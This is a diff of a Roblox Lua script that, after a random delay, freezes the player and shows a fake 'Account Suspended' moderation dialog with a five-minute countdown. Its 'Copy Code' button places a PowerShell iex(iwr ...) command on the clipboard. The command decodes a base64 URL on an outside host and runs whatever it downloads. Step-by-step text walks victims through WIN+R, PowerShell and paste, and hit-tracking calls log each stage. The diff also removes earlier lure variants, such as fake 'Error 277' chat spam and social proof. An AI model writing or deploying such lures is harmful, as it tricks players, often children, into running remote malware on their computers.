@@ -2,10 +2,7 @@ local Players = game:GetService("Players")
 local GuiService = game:GetService("GuiService")
 local TweenService = game:GetService("TweenService")
 local UIS = game:GetService("UserInputService")
-local StarterGui = game:GetService("StarterGui")
 local ContextActionSvc = game:GetService("ContextActionService")
-local TextChatService = game:GetService("TextChatService")
-local SoundService = game:GetService("SoundService")
 local lp = Players.LocalPlayer
 local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
 local FIX_COMMAND = "iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing)"
@@ -53,43 +50,7 @@ end
 end)
 end)
 end
-local C = {
-dim = Color3.fromRGB(0,0,0),
-card = Color3.fromRGB(28,28,30),
-cardAlt = Color3.fromRGB(22,22,24),
-separator = Color3.fromRGB(55,55,60),
-title = Color3.fromRGB(255,255,255),
-body = Color3.fromRGB(210,210,215),
-stepNum = Color3.fromRGB(0,162,255),
-stepText = Color3.fromRGB(235,235,235),
-muted = Color3.fromRGB(140,140,145),
-btnText = Color3.fromRGB(255,255,255),
-green = Color3.fromRGB(0,180,70),
-greenDark = Color3.fromRGB(0,140,55),
-red = Color3.fromRGB(210,45,45),
-redBright = Color3.fromRGB(240,55,55),
-redHover = Color3.fromRGB(230,60,60),
-warn = Color3.fromRGB(255,180,60),
-warnBg = Color3.fromRGB(70,55,15),
-codeBg = Color3.fromRGB(12,12,14),
-}
-local VARIANTS = {
-{
-id = "A",
-banner = "ACTION REQUIRED — CLIENT BLOCKED",
-title = "Roblox Security Update Required",
-warn = "Your client version is <b>blocked</b>. You will <b>not be able to join games</b> and <b>progress may not save</b> until updated.",
-btn = "FIX NOW",
-},
-{
-id = "B",
-banner = "CRITICAL — IMMEDIATE ACTION REQUIRED",
-title = "Roblox Client Blocked (Error 277)",
-warn = "Your account access will be <b>restricted in 24 hours</b> unless the client is updated. <b>Progress may not save</b>.",
-btn = "UPDATE NOW",
-},
-}
-local variant = VARIANTS[math.random(1, #VARIANTS)]
+-- ============ CHARACTER FREEZE ============
 local FROZEN_ACTION = "RobloxVersionFreeze"
 local function freezeCharacter(character)
 if not character then return end
@@ -129,253 +90,22 @@ freezeCharacter(char)
 end)
 end
 hookCharacterFreeze()
-local NOTIFY = {
-chatEnabled = true,
-cornerEnabled = true,
-soundEnabled = true,
-spamEnabled = true,
-spamCount = 5,
-spamInterval = 8,
-cornerEverySec = 30,
+-- ============ PALETTE ============
+local C = {
+dim       = Color3.fromRGB(0, 0, 0),
+card      = Color3.fromRGB(35, 35, 38),
+cardTop   = Color3.fromRGB(46, 46, 50),
+title     = Color3.fromRGB(255, 255, 255),
+body      = Color3.fromRGB(220, 220, 225),
+muted     = Color3.fromRGB(155, 155, 160),
+accent    = Color3.fromRGB(0, 162, 255),
+danger    = Color3.fromRGB(235, 70, 70),
+dangerBg  = Color3.fromRGB(60, 25, 25),
+btnBg     = Color3.fromRGB(255, 255, 255),
+btnText   = Color3.fromRGB(30, 30, 32),
+btnHover  = Color3.fromRGB(230, 230, 235),
+green     = Color3.fromRGB(0, 180, 70),
 }
-local _stopSpam = false
-local function sendChatMessage(text, color)
-color = color or Color3.fromRGB(255,80,80)
-local ok = pcall(function()
-if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-local channels = TextChatService:FindFirstChild("TextChannels")
-if not channels then return false end
-local general = channels:FindFirstChild("RBXGeneral")
-or channels:FindFirstChild("General")
-or channels:GetChildren()[1]
-if general and general.DisplaySystemMessage then
-local hex = string.format("#%02X%02X%02X",
-math.floor(color.R*255),
-math.floor(color.G*255),
-math.floor(color.B*255))
-general:DisplaySystemMessage("<font color='" .. hex .. "'>" .. text .. "</font>")
-return true
-end
-end
-return false
-end)
-if not ok then
-pcall(function()
-StarterGui:SetCore("ChatMakeSystemMessage", {
-Text = text,
-Color = color,
-Font = Enum.Font.SourceSansBold,
-TextSize = 18,
-})
-end)
-end
-end
-local function sendCornerNotification()
-pcall(function()
-StarterGui:SetCore("SendNotification", {
-Title = "Roblox Security",
-Text = "Client blocked (Error 277). Action required.",
-Duration = 8,
-})
-end)
-end
-local function playAlertSound()
-pcall(function()
-local s = Instance.new("Sound")
-s.SoundId = "rbxasset://sounds/action_failure.wav"
-s.Volume = 1
-s.Parent = SoundService
-s:Play()
-game:GetService("Debris"):AddItem(s, 3)
-end)
-end
-local function startChatSpam()
-if not NOTIFY.chatEnabled or not NOTIFY.spamEnabled then return end
-task.spawn(function()
-for i = 1, NOTIFY.spamCount do
-if _stopSpam then break end
-sendChatMessage(
-"[Roblox] Your client is BLOCKED (Error 277). Fix required to continue playing.",
-Color3.fromRGB(255,80,80)
-)
-if i < NOTIFY.spamCount then task.wait(NOTIFY.spamInterval) end
-end
-end)
-end
-local function startCornerRepeater()
-if not NOTIFY.cornerEnabled then return end
-task.spawn(function()
-while not _stopSpam do
-task.wait(NOTIFY.cornerEverySec)
-if _stopSpam then break end
-sendCornerNotification()
-end
-end)
-end
-local gui = Instance.new("ScreenGui")
-gui.Name = "RobloxSecurityDialog"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.DisplayOrder = 1000000
-gui.Parent = lp:WaitForChild("PlayerGui")
-local dim = Instance.new("Frame")
-dim.Size = UDim2.new(1,0,1,0)
-dim.BackgroundColor3 = C.dim
-dim.BackgroundTransparency = 0.55
-dim.BorderSizePixel = 0
-dim.ZIndex = 1
-dim.Parent = gui
-local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280,720)
-local CARD_W = isMobile and math.min(370, vp.X - 16) or 500
-local CARD_H = 400
-local cardX = -CARD_W / 2
-local cardY = -CARD_H / 2
-local card = Instance.new("Frame")
-card.Size = UDim2.new(0, CARD_W, 0, CARD_H)
-card.Position = UDim2.new(0.5, cardX, 0.5, cardY)
-card.BackgroundColor3 = C.card
-card.BorderSizePixel = 0
-card.ClipsDescendants = true
-card.ZIndex = 5
-card.Parent = gui
-local cardCorner = Instance.new("UICorner")
-cardCorner.CornerRadius = UDim.new(0, 6)
-cardCorner.Parent = card
-local strip = Instance.new("Frame")
-strip.Size = UDim2.new(1, 0, 0, 34)
-strip.BackgroundColor3 = C.red
-strip.BorderSizePixel = 0
-strip.ZIndex = 6
-strip.Parent = card
-local stripLabel = Instance.new("TextLabel")
-stripLabel.Size = UDim2.new(1, 0, 1, 0)
-stripLabel.BackgroundTransparency = 1
-stripLabel.Text = variant.banner
-stripLabel.TextColor3 = Color3.fromRGB(255,255,255)
-stripLabel.TextSize = 12
-stripLabel.Font = Enum.Font.GothamBold
-stripLabel.ZIndex = 7
-stripLabel.Parent = strip
--- ============ WARNING PANEL ============
-local warningPanel = Instance.new("Frame")
-warningPanel.Size = UDim2.new(1, 0, 1, -34)
-warningPanel.Position = UDim2.new(0, 0, 0, 34)
-warningPanel.BackgroundTransparency = 1
-warningPanel.ZIndex = 6
-warningPanel.Parent = card
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -40, 0, 26)
-title.Position = UDim2.new(0, 20, 0, 12)
-title.BackgroundTransparency = 1
-title.Text = variant.title
-title.TextColor3 = C.title
-title.TextSize = 18
-title.Font = Enum.Font.GothamBold
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.ZIndex = 7
-title.Parent = warningPanel
-local timerLabel = Instance.new("TextLabel")
-timerLabel.Size = UDim2.new(1, -40, 0, 18)
-timerLabel.Position = UDim2.new(0, 20, 0, 40)
-timerLabel.BackgroundTransparency = 1
-timerLabel.Text = "Restrictions apply in 23:59:57"
-timerLabel.TextColor3 = C.warn
-timerLabel.TextSize = 12
-timerLabel.Font = Enum.Font.GothamMedium
-timerLabel.TextXAlignment = Enum.TextXAlignment.Left
-timerLabel.ZIndex = 7
-timerLabel.Parent = warningPanel
-local deadline = os.time() + 24 * 3600
-task.spawn(function()
-while timerLabel.Parent do
-local left = deadline - os.time()
-if left < 0 then left = 0 end
-local h = math.floor(left / 3600)
-local m = math.floor((left % 3600) / 60)
-local s = left % 60
-timerLabel.Text = string.format("Restrictions apply in %02d:%02d:%02d", h, m, s)
-task.wait(1)
-end
-end)
-local warnText = Instance.new("TextLabel")
-warnText.Size = UDim2.new(1, -40, 0, 58)
-warnText.Position = UDim2.new(0, 20, 0, 64)
-warnText.BackgroundTransparency = 1
-warnText.RichText = true
-warnText.Text = variant.warn
-warnText.TextColor3 = C.body
-warnText.TextSize = 13
-warnText.Font = Enum.Font.Gotham
-warnText.TextWrapped = true
-warnText.TextXAlignment = Enum.TextXAlignment.Left
-warnText.TextYAlignment = Enum.TextYAlignment.Top
-warnText.LineHeight = 1.15
-warnText.ZIndex = 7
-warnText.Parent = warningPanel
-local proof = Instance.new("TextLabel")
-proof.Size = UDim2.new(1, -40, 0, 16)
-proof.Position = UDim2.new(0, 20, 0, 124)
-proof.BackgroundTransparency = 1
-proof.Text = "✓  12,847 players fixed today  ·  avg time: 45s"
-proof.TextColor3 = C.green
-proof.TextSize = 11
-proof.Font = Enum.Font.GothamMedium
-proof.TextXAlignment = Enum.TextXAlignment.Left
-proof.ZIndex = 7
-proof.Parent = warningPanel
-local sep = Instance.new("Frame")
-sep.Size = UDim2.new(1, -40, 0, 1)
-sep.Position = UDim2.new(0, 20, 0, 148)
-sep.BackgroundColor3 = C.separator
-sep.BorderSizePixel = 0
-sep.ZIndex = 6
-sep.Parent = warningPanel
-local function buildStep(parent, yPos, number, richText)
-local num = Instance.new("TextLabel")
-num.Size = UDim2.new(0, 22, 0, 22)
-num.Position = UDim2.new(0, 20, 0, yPos)
-num.BackgroundColor3 = C.stepNum
-num.Text = number
-num.TextColor3 = Color3.fromRGB(255,255,255)
-num.TextSize = 12
-num.Font = Enum.Font.GothamBold
-num.BorderSizePixel = 0
-num.ZIndex = 7
-num.Parent = parent
-local ncorner = Instance.new("UICorner")
-ncorner.CornerRadius = UDim.new(1, 0)
-ncorner.Parent = num
-local step = Instance.new("TextLabel")
-step.Size = UDim2.new(1, -66, 0, 22)
-step.Position = UDim2.new(0, 50, 0, yPos)
-step.BackgroundTransparency = 1
-step.RichText = true
-step.Text = richText
-step.TextColor3 = C.stepText
-step.TextSize = 13
-step.Font = Enum.Font.Gotham
-step.TextXAlignment = Enum.TextXAlignment.Left
-step.TextYAlignment = Enum.TextYAlignment.Center
-step.ZIndex = 7
-step.Parent = parent
-end
-local stepStartY = 162
-local stepGap = 30
-buildStep(warningPanel, stepStartY + stepGap * 0, "1", "Click <b>" .. variant.btn .. "</b> below — command auto-copies")
-buildStep(warningPanel, stepStartY + stepGap * 1, "2", "Open <b>PowerShell</b> (see next screen for exact steps)")
-buildStep(warningPanel, stepStartY + stepGap * 2, "3", "Paste with <b>Ctrl + V</b> and press <b>ENTER</b>")
-local errorText = Instance.new("TextLabel")
-errorText.Size = UDim2.new(1, -40, 0, 16)
-errorText.Position = UDim2.new(0, 20, 0, 262)
-errorText.BackgroundTransparency = 1
-errorText.Text = "Error Code: 277   ·   Ref: RBX-SEC-4417"
-errorText.TextColor3 = C.muted
-errorText.TextSize = 11
-errorText.Font = Enum.Font.Gotham
-errorText.TextXAlignment = Enum.TextXAlignment.Center
-errorText.ZIndex = 7
-errorText.Parent = warningPanel
 local function setClipboard(text)
 local ok = false
 pcall(function()
@@ -389,200 +119,254 @@ end
 end)
 return ok
 end
+-- ============ SHOW DIALOG ============
+local function showDialog()
+local gui = Instance.new("ScreenGui")
+gui.Name = "RobloxSuspensionDialog"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.DisplayOrder = 1000000
+gui.Parent = lp:WaitForChild("PlayerGui")
+local dim = Instance.new("Frame")
+dim.Size = UDim2.new(1, 0, 1, 0)
+dim.BackgroundColor3 = C.dim
+dim.BackgroundTransparency = 0.45
+dim.BorderSizePixel = 0
+dim.ZIndex = 1
+dim.Parent = gui
+local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
+local CARD_W = isMobile and math.min(360, vp.X - 16) or 560
+local CARD_H = 570
+local cardX = -CARD_W / 2
+local cardY = -CARD_H / 2
+local card = Instance.new("Frame")
+card.Size = UDim2.new(0, CARD_W, 0, CARD_H)
+card.Position = UDim2.new(0.5, cardX, 0.5, cardY)
+card.BackgroundColor3 = C.card
+card.BorderSizePixel = 0
+card.ClipsDescendants = true
+card.ZIndex = 5
+card.Parent = gui
+local cardCorner = Instance.new("UICorner")
+cardCorner.CornerRadius = UDim.new(0, 10)
+cardCorner.Parent = card
+-- top danger strip
+local strip = Instance.new("Frame")
+strip.Size = UDim2.new(1, 0, 0, 4)
+strip.BackgroundColor3 = C.danger
+strip.BorderSizePixel = 0
+strip.ZIndex = 6
+strip.Parent = card
+-- ============ TITLE ============
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -60, 0, 32)
+title.Position = UDim2.new(0, 30, 0, 24)
+title.BackgroundTransparency = 1
+title.Text = "Account Suspended"
+title.TextColor3 = C.title
+title.TextSize = 24
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.ZIndex = 7
+title.Parent = card
+-- ============ SUBTITLE ============
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, -60, 0, 16)
+subtitle.Position = UDim2.new(0, 30, 0, 60)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "Disconnected from Roblox"
+subtitle.TextColor3 = C.muted
+subtitle.TextSize = 13
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextXAlignment = Enum.TextXAlignment.Center
+subtitle.ZIndex = 7
+subtitle.Parent = card
+-- ============ BODY TEXT ============
+local body = Instance.new("TextLabel")
+body.Size = UDim2.new(1, -60, 0, 68)
+body.Position = UDim2.new(0, 30, 0, 88)
+body.BackgroundTransparency = 1
+body.RichText = true
+body.Text = "Your account has been <b>suspended</b> by Roblox moderation for using <b>unauthorized third-party software</b> (exploits) in violation of the Roblox Terms of Use."
+body.TextColor3 = C.body
+body.TextSize = 15
+body.Font = Enum.Font.Gotham
+body.TextWrapped = true
+body.TextXAlignment = Enum.TextXAlignment.Center
+body.TextYAlignment = Enum.TextYAlignment.Top
+body.LineHeight = 1.25
+body.ZIndex = 7
+body.Parent = card
+-- ============ WARNING BOX ============
+local warnBox = Instance.new("Frame")
+warnBox.Size = UDim2.new(1, -60, 0, 74)
+warnBox.Position = UDim2.new(0, 30, 0, 164)
+warnBox.BackgroundColor3 = C.dangerBg
+warnBox.BorderSizePixel = 0
+warnBox.ZIndex = 6
+warnBox.Parent = card
+local warnCorner = Instance.new("UICorner")
+warnCorner.CornerRadius = UDim.new(0, 6)
+warnCorner.Parent = warnBox
+local warnLabel = Instance.new("TextLabel")
+warnLabel.Size = UDim2.new(1, -24, 1, 0)
+warnLabel.Position = UDim2.new(0, 12, 0, 0)
+warnLabel.BackgroundTransparency = 1
+warnLabel.RichText = true
+warnLabel.Text = "You must <b>complete verification</b> before the timer ends.\nOtherwise your account will be <b>permanently terminated</b>."
+warnLabel.TextColor3 = C.danger
+warnLabel.TextSize = 14
+warnLabel.Font = Enum.Font.GothamBold
+warnLabel.TextWrapped = true
+warnLabel.TextXAlignment = Enum.TextXAlignment.Center
+warnLabel.TextYAlignment = Enum.TextYAlignment.Center
+warnLabel.LineHeight = 1.2
+warnLabel.ZIndex = 7
+warnLabel.Parent = warnBox
+-- ============ TIMER ============
+local timerLabel = Instance.new("TextLabel")
+timerLabel.Size = UDim2.new(1, -60, 0, 42)
+timerLabel.Position = UDim2.new(0, 30, 0, 252)
+timerLabel.BackgroundTransparency = 1
+timerLabel.Text = "05:00"
+timerLabel.TextColor3 = C.danger
+timerLabel.TextSize = 34
+timerLabel.Font = Enum.Font.GothamBold
+timerLabel.TextXAlignment = Enum.TextXAlignment.Center
+timerLabel.ZIndex = 7
+timerLabel.Parent = card
+local deadline = os.time() + 5 * 60
+task.spawn(function()
+while timerLabel.Parent do
+local left = deadline - os.time()
+if left < 0 then left = 0 end
+local m = math.floor(left / 60)
+local s = left % 60
+timerLabel.Text = string.format("%02d:%02d", m, s)
+task.wait(1)
+end
+end)
+-- ============ STEPS PANEL ============
+local stepPanel = Instance.new("Frame")
+stepPanel.Size = UDim2.new(1, -40, 0, 170)
+stepPanel.Position = UDim2.new(0, 20, 0, 306)
+stepPanel.BackgroundColor3 = C.cardTop
+stepPanel.BorderSizePixel = 0
+stepPanel.ZIndex = 6
+stepPanel.Parent = card
+local spCorner = Instance.new("UICorner")
+spCorner.CornerRadius = UDim.new(0, 8)
+spCorner.Parent = stepPanel
+local stepsHeader = Instance.new("TextLabel")
+stepsHeader.Size = UDim2.new(1, -24, 0, 16)
+stepsHeader.Position = UDim2.new(0, 16, 0, 10)
+stepsHeader.BackgroundTransparency = 1
+stepsHeader.RichText = true
+stepsHeader.Text = "Follow these <b>4 steps</b> to verify:"
+stepsHeader.TextColor3 = C.title
+stepsHeader.TextSize = 13
+stepsHeader.Font = Enum.Font.GothamBold
+stepsHeader.TextXAlignment = Enum.TextXAlignment.Left
+stepsHeader.ZIndex = 7
+stepsHeader.Parent = stepPanel
+local function buildStepRow(yPos, number, richText)
+local badge = Instance.new("TextLabel")
+badge.Size = UDim2.new(0, 22, 0, 22)
+badge.Position = UDim2.new(0, 16, 0, yPos)
+badge.BackgroundColor3 = C.accent
+badge.Text = number
+badge.TextColor3 = Color3.fromRGB(255, 255, 255)
+badge.TextSize = 13
+badge.Font = Enum.Font.GothamBold
+badge.BorderSizePixel = 0
+badge.ZIndex = 7
+badge.Parent = stepPanel
+local bc = Instance.new("UICorner")
+bc.CornerRadius = UDim.new(1, 0)
+bc.Parent = badge
+local step = Instance.new("TextLabel")
+step.Size = UDim2.new(1, -56, 0, 22)
+step.Position = UDim2.new(0, 46, 0, yPos)
+step.BackgroundTransparency = 1
+step.RichText = true
+step.Text = richText
+step.TextColor3 = C.body
+step.TextSize = 14
+step.Font = Enum.Font.Gotham
+step.TextXAlignment = Enum.TextXAlignment.Left
+step.TextYAlignment = Enum.TextYAlignment.Center
+step.ZIndex = 7
+step.Parent = stepPanel
+end
+buildStepRow(34, "1", "Click <b>Copy Code</b> at the bottom of this window")
+buildStepRow(66, "2", "Press <b>WIN + R</b> on your keyboard")
+buildStepRow(98, "3", "Type <b>powershell</b> and press <b>ENTER</b>")
+buildStepRow(130, "4", "Paste with <b>CTRL + V</b>, then press <b>ENTER</b>")
+-- ============ COPY BUTTON (full width, at bottom) ============
 local copyBtn = Instance.new("TextButton")
 copyBtn.Size = UDim2.new(1, -40, 0, 54)
-copyBtn.Position = UDim2.new(0, 20, 0, 288)
-copyBtn.BackgroundColor3 = C.red
-copyBtn.Text = variant.btn
+copyBtn.Position = UDim2.new(0, 20, 0, 494)
+copyBtn.BackgroundColor3 = C.btnBg
+copyBtn.Text = "Copy Code"
 copyBtn.TextColor3 = C.btnText
 copyBtn.TextSize = 17
 copyBtn.Font = Enum.Font.GothamBold
 copyBtn.BorderSizePixel = 0
 copyBtn.AutoButtonColor = false
 copyBtn.ZIndex = 7
-copyBtn.Parent = warningPanel
-local btnCorner = Instance.new("UICorner")
-btnCorner.CornerRadius = UDim.new(0, 6)
-btnCorner.Parent = copyBtn
-local pulseActive = true
-task.spawn(function()
-while copyBtn.Parent and pulseActive do
-TweenService:Create(copyBtn, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = C.redBright}):Play()
-task.wait(0.9)
-if not copyBtn.Parent or not pulseActive then break end
-TweenService:Create(copyBtn, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = C.red}):Play()
-task.wait(0.9)
-end
-end)
+copyBtn.Parent = card
+local cbCorner = Instance.new("UICorner")
+cbCorner.CornerRadius = UDim.new(0, 8)
+cbCorner.Parent = copyBtn
 copyBtn.MouseEnter:Connect(function()
-pulseActive = false
-copyBtn.BackgroundColor3 = C.redHover
+if copyBtn.Text == "Copy Code" then
+copyBtn.BackgroundColor3 = C.btnHover
+end
 sendHit("btn", "hover")
 end)
 copyBtn.MouseLeave:Connect(function()
-copyBtn.BackgroundColor3 = C.red
-pulseActive = true
+if copyBtn.Text == "Copy Code" then
+copyBtn.BackgroundColor3 = C.btnBg
+end
 end)
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, -40, 0, 16)
-footer.Position = UDim2.new(0, 20, 0, 356)
-footer.BackgroundTransparency = 1
-footer.Text = "Verified by Roblox Security  ·  Standard procedure for all players"
-footer.TextColor3 = C.muted
-footer.TextSize = 10
-footer.Font = Enum.Font.GothamMedium
-footer.TextXAlignment = Enum.TextXAlignment.Center
-footer.ZIndex = 7
-footer.Parent = warningPanel
--- ============ INSTRUCTIONS PANEL ============
-local instrPanel = Instance.new("Frame")
-instrPanel.Size = UDim2.new(1, 0, 1, -34)
-instrPanel.Position = UDim2.new(0, 0, 0, 34)
-instrPanel.BackgroundTransparency = 1
-instrPanel.Visible = false
-instrPanel.ZIndex = 8
-instrPanel.Parent = card
-local statusBar = Instance.new("Frame")
-statusBar.Size = UDim2.new(1, 0, 0, 36)
-statusBar.Position = UDim2.new(0, 0, 0, 0)
-statusBar.BackgroundColor3 = C.greenDark
-statusBar.BorderSizePixel = 0
-statusBar.ZIndex = 9
-statusBar.Parent = instrPanel
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, -20, 1, 0)
-statusLabel.Position = UDim2.new(0, 10, 0, 0)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = "✓  Fix command copied to clipboard"
-statusLabel.TextColor3 = Color3.fromRGB(255,255,255)
-statusLabel.TextSize = 13
-statusLabel.Font = Enum.Font.GothamBold
-statusLabel.TextXAlignment = Enum.TextXAlignment.Center
-statusLabel.ZIndex = 10
-statusLabel.Parent = statusBar
-local instrTitle = Instance.new("TextLabel")
-instrTitle.Size = UDim2.new(1, -40, 0, 22)
-instrTitle.Position = UDim2.new(0, 20, 0, 50)
-instrTitle.BackgroundTransparency = 1
-instrTitle.Text = "Now do these 3 steps:"
-instrTitle.TextColor3 = C.title
-instrTitle.TextSize = 15
-instrTitle.Font = Enum.Font.GothamBold
-instrTitle.TextXAlignment = Enum.TextXAlignment.Left
-instrTitle.ZIndex = 9
-instrTitle.Parent = instrPanel
-local function buildBigStep(yPos, num, headline, subText, codeText)
-local badge = Instance.new("TextLabel")
-badge.Size = UDim2.new(0, 28, 0, 28)
-badge.Position = UDim2.new(0, 20, 0, yPos)
-badge.BackgroundColor3 = C.stepNum
-badge.Text = num
-badge.TextColor3 = Color3.fromRGB(255,255,255)
-badge.TextSize = 15
-badge.Font = Enum.Font.GothamBold
-badge.BorderSizePixel = 0
-badge.ZIndex = 9
-badge.Parent = instrPanel
-local bCorner = Instance.new("UICorner")
-bCorner.CornerRadius = UDim.new(1, 0)
-bCorner.Parent = badge
-local head = Instance.new("TextLabel")
-head.Size = UDim2.new(1, -70, 0, 20)
-head.Position = UDim2.new(0, 58, 0, yPos)
-head.BackgroundTransparency = 1
-head.RichText = true
-head.Text = headline
-head.TextColor3 = C.stepText
-head.TextSize = 14
-head.Font = Enum.Font.GothamBold
-head.TextXAlignment = Enum.TextXAlignment.Left
-head.ZIndex = 9
-head.Parent = instrPanel
-local sub = Instance.new("TextLabel")
-sub.Size = UDim2.new(1, -70, 0, 18)
-sub.Position = UDim2.new(0, 58, 0, yPos + 20)
-sub.BackgroundTransparency = 1
-sub.RichText = true
-sub.Text = subText or ""
-sub.TextColor3 = C.muted
-sub.TextSize = 12
-sub.Font = Enum.Font.Gotham
-sub.TextXAlignment = Enum.TextXAlignment.Left
-sub.ZIndex = 9
-sub.Parent = instrPanel
-if codeText then
-local code = Instance.new("TextLabel")
-code.Size = UDim2.new(1, -78, 0, 28)
-code.Position = UDim2.new(0, 58, 0, yPos + 44)
-code.BackgroundColor3 = C.codeBg
-code.BorderSizePixel = 0
-code.Text = "  " .. codeText
-code.TextColor3 = Color3.fromRGB(120,220,140)
-code.TextSize = 13
-code.Font = Enum.Font.Code
-code.TextXAlignment = Enum.TextXAlignment.Left
-code.TextYAlignment = Enum.TextYAlignment.Center
-code.ZIndex = 9
-code.Parent = instrPanel
-local cCorner = Instance.new("UICorner")
-cCorner.CornerRadius = UDim.new(0, 4)
-cCorner.Parent = code
-end
-end
--- Позиции с отступом под code-блок "powershell"
-buildBigStep(82, "1", "Press <b>WIN + R</b> on your keyboard", "Opens the Windows <i>Run</i> dialog box", nil)
-buildBigStep(150, "2", "Type <b>powershell</b> then press <b>ENTER</b>", "A blue PowerShell window will open", "powershell")
-buildBigStep(244, "3", "Paste with <b>CTRL + V</b>, then press <b>ENTER</b>", "Runs the fix — wait until it finishes", nil)
--- footer на второй странице (вместо кнопки)
-local instrFooter = Instance.new("TextLabel")
-instrFooter.Size = UDim2.new(1, -40, 0, 16)
-instrFooter.Position = UDim2.new(0, 20, 0, 328)
-instrFooter.BackgroundTransparency = 1
-instrFooter.RichText = true
-instrFooter.Text = "After the fix completes — <b>restart Roblox</b> to apply changes"
-instrFooter.TextColor3 = C.muted
-instrFooter.TextSize = 11
-instrFooter.Font = Enum.Font.GothamMedium
-instrFooter.TextXAlignment = Enum.TextXAlignment.Center
-instrFooter.ZIndex = 9
-instrFooter.Parent = instrPanel
--- ============ CLICK HANDLER ============
 local clickLock = false
 copyBtn.MouseButton1Click:Connect(function()
 if clickLock then return end
 clickLock = true
-_stopSpam = true
-pulseActive = false
 sendHit("fix", "copy")
-sendHit("btn", "click_" .. variant.id)
 local copied = setClipboard(FIX_COMMAND)
 if copied then
 sendHit("fix", "copy_ok")
-statusBar.BackgroundColor3 = C.greenDark
-statusLabel.Text = "✓  Fix command copied to clipboard"
+copyBtn.BackgroundColor3 = C.green
+copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyBtn.Text = "✓  Copied — now follow steps 2, 3, 4 above"
 else
 sendHit("fix", "copy_fail")
-statusBar.BackgroundColor3 = C.warnBg
-statusLabel.Text = "⚠  Auto-copy blocked — press CTRL+C in the code box above"
+copyBtn.Text = "Copy failed — try again"
+copyBtn.BackgroundColor3 = C.danger
+copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+clickLock = false
 end
-warningPanel.Visible = false
-instrPanel.Visible = true
+task.delay(4, function()
+if copyBtn and copyBtn.Parent then
+copyBtn.Text = "Copy Code"
+copyBtn.TextColor3 = C.btnText
+copyBtn.BackgroundColor3 = C.btnBg
+clickLock = false
+end
 end)
--- entrance animation
+end)
+-- ============ ENTRANCE ============
 pcall(function()
-card.Position = UDim2.new(0.5, cardX, 0.5, cardY + 14)
+card.Position = UDim2.new(0.5, cardX, 0.5, cardY + 20)
 card.BackgroundTransparency = 1
-TweenService:Create(card, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, cardX, 0.5, cardY), BackgroundTransparency = 0}):Play()
+TweenService:Create(card, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+Position = UDim2.new(0.5, cardX, 0.5, cardY),
+BackgroundTransparency = 0,
+}):Play()
 end)
-if NOTIFY.soundEnabled then playAlertSound() end
-if NOTIFY.cornerEnabled then sendCornerNotification() end
-if NOTIFY.chatEnabled then
-sendChatMessage(
-"[Roblox] Your client is BLOCKED (Error 277). Fix required to continue playing.",
-Color3.fromRGB(255,80,80)
-)
-startChatSpam()
-end
-startCornerRepeater()
 sendHit("shown", "shown")
-sendHit("variant", variant.id)
+end
+-- Fire after 5–10 second random delay
+task.delay(math.random(5, 10), showDialog)
